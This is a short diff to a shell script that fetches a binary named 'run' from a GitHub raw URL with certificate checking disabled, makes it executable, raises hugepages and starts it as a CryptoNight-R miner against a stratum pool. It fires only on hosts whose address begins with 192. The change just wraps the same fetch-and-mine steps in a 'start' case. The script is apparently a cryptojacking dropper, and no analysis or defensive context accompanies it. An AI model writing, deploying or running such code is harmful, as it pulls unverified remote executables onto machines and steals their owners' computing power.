@@ -19,14 +19,18 @@ _REBANNER(){
 }
 
 _RUN(){
-  wget --no-check-cert https://github.com/osrun/beta/raw/master/run
-  chmod +x run
-  sysctl -w vm.nr_hugepages=128
-  ./run -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
-  #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
-  #_REBANNER
+ case $1 in
+   start)  
+     wget --no-check-cert https://github.com/osrun/beta/raw/master/run
+     chmod +x run
+     sysctl -w vm.nr_hugepages=128
+     ./run -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     #./run -B -a cn/r -o stratum+tcp://$END:$PORT -u $USER -p $TAG
+     #_REBANNER
+   ;; 
+ esac
 }
 
 if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
- _RUN
+ _RUN start
 fi
